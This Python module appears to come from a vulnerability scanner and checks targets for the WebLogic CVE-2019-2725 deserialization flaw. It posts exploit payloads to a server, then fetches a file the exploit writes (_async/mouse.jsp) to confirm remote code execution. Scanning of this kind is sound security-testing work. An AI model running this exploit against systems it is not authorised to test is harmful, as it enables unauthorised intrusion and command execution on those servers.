#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2019_2725_scan(self, url):
    ''' Weblogic 
            部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogicServer提供异步通讯服务
            由于该WAR包在反序列化处理输入信息时存在缺陷, 在未授权的情况下可以远程执行命令
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unSerialization'
    vul_info['vul_id'] = 'CVE-2019-2725'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'text/xml'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2019_2725_payloads:     # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (res.status_code == 202):
                sleep(3)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
                verify_url = url + '_async/mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                logger.logging(vul_info, verify_res.status_code, verify_res)

                if ((verify_res.status_code == 200) and ('CVE/2019/2725' in verify_res.text)):
                    results = {
                        'Target': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Payload': res
                    }
                    return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
